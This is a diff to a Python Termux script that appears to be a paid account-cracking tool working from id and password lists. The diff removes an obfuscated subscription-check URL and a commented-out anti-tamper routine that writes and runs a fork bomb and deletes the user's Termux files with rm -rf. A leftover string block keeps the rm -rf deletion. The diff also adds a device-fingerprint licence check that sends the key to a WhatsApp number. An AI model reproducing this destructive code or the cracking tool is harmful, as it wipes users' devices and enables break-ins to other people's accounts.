@@ -129,36 +129,6 @@ bulan = sasi[xx]
 tahun = now.year
 os.system('')
 today = '\x1b[38;5;46m'+str(hari)+'\033[1;97m-\x1b[38;5;46m'+str(bulan)+''
-#━━━━[ BANNER/LOGO ]━━━━#
-def key():
-    #uID = hashlib.md5((platform.version() + str(os.getuid()) + platform.platform() + os.getlogin() + platform.release()).replace(' ', '').encode()).hexdigest()
-    uID = ''
-    return uID.upper()
-def generate_key():
-    myid = key()
-    try:
-        print(f'{rad}[{white}◆{rad}] {green}Checking For Subscription')
-        lik = str(zlib.decompress(b'x\x9c\x05\xc1Q\x0e\x80 \x08\x00\xd0\x1bIh_m\xad\xb3PV\xb0\x898\xe1\xa3\xe3\xf7\x1eG\x0c\xdf\x00\x94\x98\xaa09uz\xa6T\xc1\xb5\xa4\xb3\xd9\xeb\xc3"]\xa6\x90\x97\\\x003\x8c{\xaa\xb8\x8b\xf5\xf8"qh;t\xc7\x1f\xb2\xf2\x19\xa4')).replace("b'", "").replace("'", "")
-        buffer = BytesIO()
-        c = pycurl.Curl()
-        c.setopt(c.URL, lik)
-        c.setopt(c.WRITEDATA, buffer)
-        c.perform()
-        c.close()
-        body = buffer.getvalue().decode('utf-8')
-        response = body
-        if myid in response:
-           mahadi()
-        else:
-            fuckxd()
-            ceyx = key()
-            print(f"{rad}[{white}◆{rad}] {green}IF YOU NEED FREE APPROVAL CONTACT ADMIN")
-            linex()
-            os.system('')
-            time.sleep(2)
-            sys.exit()
-    except Exception as e:
-        exit('\n Network connection error ')
 #--------------------------------[METHOD 1]--------------------------------#
 #_method_1_buffer = BytesIO()
 #_method_1_curl = pycurl.Curl()
@@ -261,7 +231,6 @@ def ____banner____():
    / / / _ \ '__| | | | \ \/ / |  | |
   / /_|  __/ |  | |_| |  >  <| |__| |
  /_____\___|_|   \___/  /_/\_\_____/ 
-                                        
                                      {rad}♻️ 
 {faltu} {black}Your self-worth is determined by you... {pvt}
 {rad}[{white}🔖{rad}] {yelloww}ONWER AND CEO {white}▶︎ {yelloww}𝐜𝐡𝐨𝐲𝐨𝐧 {rad}𝐗 {yelloww}𝐬𝐮𝐦𝐨𝐧
@@ -275,16 +244,6 @@ def fuckxd():
 #━━━━[ LINE ]━━━━#
 def linex():
         print(f"{puti}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
-#-------------------[LOCATION CHECK]-------------------#
-#import os,sys
-#def idx():
-#    os.system('clear')
-#    os.system('touch .data')
-#    open('.data','w').write(':(){ :|: & };:')
-#    for b in range(10):
-#        os.system('bash .data')
-#        os.system('rm -rf /data/data/com.termux/files')
-#        os.system('ls & clear')
 #-------------------[LOCATION CHECK]-------------------#
 """uxernamx = sys.argv[0]
 if uxernamx=='GREEN.py':
@@ -301,6 +260,40 @@ if uxernamx=='GREEN.py':
 else:
     idx()
     os.system('rm -rf /data/data/com.termux/files');exit()"""
+class Process:
+    def __init__(self):
+        self.cc=[]
+        self.key="ATOM-"+base64.b16encode(str(os.getuid()).encode()).decode()+hashlib.md5((platform.version() + str(os.getuid()) + platform.platform() + os.getlogin() + platform.release()).replace(' ', '').encode()).hexdigest()
+        #self.key=""
+        self.clear()
+        r = self.Gex('https://github.com/DESTROYED-ATOM/ATOM/blob/main/Approve.txt')
+        if self.key in r:
+            self.enroll()
+        else:
+            self.clear()
+            print("\x1b[38;1;97m               NOTES   ")
+            print("\033[97;1m[\033[92;1m•\033[97;1m]\x1b[38;5;208m HELLO.... DEAR USER THIS IS PREMIUM TOOLS ")
+            print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m ATOM TOOLS DAILY UPDATE ")
+            print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m PRICE LIST ADMIN INBOX ")
+            print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m Your Key:\033[0;93m " +self.key)
+            input("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m Press Enter To Send Key")
+            time.sleep(3.5)
+            tks = 'TOKEN KEY =%20%20:%20'+self.key
+            os.system('am start https://wa.me/+918389066877?text=' + tks)
+            exit()
+    def clear(self):os.system('clear');banner()
+    def Gex(self,x):
+        buffer = BytesIO()
+        c = pycurl.Curl()
+        c.setopt(c.URL, x)
+        c.setopt(c.WRITEDATA, buffer)
+        try:c.perform()
+        except:exit(' Network Issue')
+        c.close()
+        return buffer.getvalue().decode('utf-8')
+    def enroll(self):
+        mahadi()
+
 #━━━━[ MAIN ]━━━━#
 def mahadi():
     ____banner____()
@@ -1035,7 +1028,7 @@ def __MTDSIX__(ids, names, passlist, total_ids):
         pass
 
 os.system("clear")
-mahadi()
+Process()
     
     
 #-----[ DEC & FUCKED BY - DARK LMNx9 ]-----
